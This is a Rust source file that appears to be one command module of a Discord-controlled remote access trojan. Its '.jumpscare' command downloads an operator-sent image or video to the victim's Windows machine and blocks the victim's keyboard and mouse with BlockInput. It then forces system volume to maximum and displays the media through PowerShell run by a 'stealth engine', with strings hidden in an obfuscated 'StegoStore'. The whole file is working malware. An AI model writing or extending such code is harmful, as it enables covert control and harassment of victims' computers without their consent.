use serde_json;
use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;
use std::os::windows::process::CommandExt;
use winapi::um::winuser::BlockInput;

pub struct JumpscareCommand;

#[async_trait]
impl BotCommand for JumpscareCommand {
    fn name(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::CmdMeta, "CMD_JUMPSCARE").into_boxed_str())
    }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "JUMPSCARE").into_boxed_str())
    }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".jumpscare (with image/video attachment)" }
    fn examples(&self) -> &'static [&'static str] { 
        &[".jumpscare (attach jpg)", ".jumpscare (attach mp4)"] 
    }
    fn aliases(&self) -> &'static [&'static str] { 
        &["scare"]
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        if msg.attachments.is_empty() {
            http.create_message(msg.channel_id.get(), "Please attach an image or video file.\n**Supported formats:**\n- Images: jpg, jpeg, png, gif, bmp, webp\n- Videos: mp4, webm, avi, mov").await?;
            return Ok(());
        }

        let attachment = &msg.attachments[0];
        let extension = Path::new(&attachment.filename)
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("");

        let file_type = Self::validate_file_type(extension)?;

        let status_msg = http
            .create_message(msg.channel_id.into(), &format!("Downloading `{}`...", attachment.filename)).await?;
        let status_message: Message = serde_json::from_str(&status_msg)?;

        let temp_path = Self::get_temp_path(&attachment.filename);

        let client = reqwest::Client::builder()
            .user_agent("Snaky-Bot/1.0")
            .timeout(std::time::Duration::from_secs(120))
            .build()?;

        match client.get(&attachment.url).send().await {
            Ok(resp) => {
                if !resp.status().is_success() {
                    http.update_message(msg.channel_id, status_message.id, Some(format!("Failed to download. Status: {}", resp.status()))).await?;
                    return Ok(());
                }

                let bytes = resp.bytes().await?;
                fs::write(&temp_path, &bytes)?;

                let http_clone = http.clone();
                let channel_id = msg.channel_id;
                let status_id = status_message.id;
                let tp = temp_path.clone();
                
                std::thread::spawn(move || {
                    match Self::execute_jumpscare(&tp, file_type) {
                        Ok(_) => {
                            // Execution is now asynchronous via KCT. The PS script will clean up the file.
                        }
                        Err(_) => {}
                    }
                });

                http.update_message(msg.channel_id, status_message.id, Some("> Jumpscare triggered successfully".to_string())).await?;
            }
            Err(e) => {
                http.update_message(msg.channel_id, status_message.id, Some(format!("Failed to download: {}", e))).await?;
            }
        }

        Ok(())
    }
}

#[derive(Debug, Clone, Copy)]
enum FileType {
    Image,
    Video,
}

impl JumpscareCommand {
    fn validate_file_type(extension: &str) -> Result<FileType> {
        let ext_lower = extension.to_lowercase();
        
        match ext_lower.as_str() {
            "jpg" | "jpeg" | "png" | "gif" | "bmp" | "webp" => Ok(FileType::Image),
            "mp4" | "webm" | "avi" | "mov" => Ok(FileType::Video),
            _ => Err(anyhow::Error::msg(format!(
                "Unsupported file type: .{}\nSupported: jpg, png, gif, bmp, webp, mp4, webm, avi, mov",
                extension
            ))),
        }
    }

    fn get_temp_path(filename: &str) -> PathBuf {
        std::env::temp_dir().join(format!("snaky_jumpscare_{}", filename))
    }

    fn execute_jumpscare(file_path: &Path, file_type: FileType) -> Result<()> {
        unsafe {
            BlockInput(1);
        }

        // Set master volume to max
        #[cfg(windows)]
        {
            use windows_volume_control::AudioController;
            unsafe {
                let mut controller = AudioController::init(None);
                controller.GetSessions();
                controller.GetDefaultAudioEnpointVolumeControl();
                if let Some(session) = controller.get_session_by_name("master".to_string()) {
                    session.setVolume(1.0);
                }
            }
        }

        let result = match file_type {
            FileType::Image => Self::show_if(file_path),
            FileType::Video => Self::play_vf(file_path),
        };

        unsafe {
            BlockInput(0);
        }
        result
    }

    fn show_if(image_path: &Path) -> Result<()> {
        let ps_template = StegoStore::get(StringCategory::Scripts, "JUMP_IMG_PS");
        let path_str = image_path.display().to_string().replace("\\", "\\\\");
        // Add file cleanup to the end of the script since execution is asynchronous
        let ps_script = format!("{}; Start-Sleep -Seconds 5; Remove-Item -Path '{}' -Force;", 
            ps_template.replace("__FILE_PATH__", &path_str), 
            image_path.display().to_string()
        );

        if let Some(engine) = crate::stealth::get_engine() {
            engine.execute_stealth_ps(&ps_script)?;
        } else {
             return Err(anyhow::anyhow!("Stealth engine not initialized"));
        }
        Ok(())
    }


    fn play_vf(video_path: &Path) -> Result<()> {
        let video_path_str = video_path.display().to_string();
        
        // Ensure volume is included in the script if not already in the stego string
        let ps_template = StegoStore::get(StringCategory::Scripts, "JUMP_VID_PS");
        let mut ps_script = ps_template.replace("__FILE_PATH__", &video_path_str.replace("\\", "\\\\"));
        
        // Inject volume control inside the XAML/Script if needed
        if !ps_script.contains(".Volume =") {
            ps_script = ps_script.replace("$mediaPlayer.Play();", "$mediaPlayer.Volume = 1.0; $mediaPlayer.Play();");
        }

        // Add cleanup
        ps_script = format!("{}; Remove-Item -Path '{}' -Force;", ps_script, video_path_str);

        if let Some(engine) = crate::stealth::get_engine() {
            engine.execute_stealth_ps(&ps_script)?;
        } else {
            return Err(anyhow::anyhow!("Stealth engine not initialized"));
        }

        Ok(())
    }
}



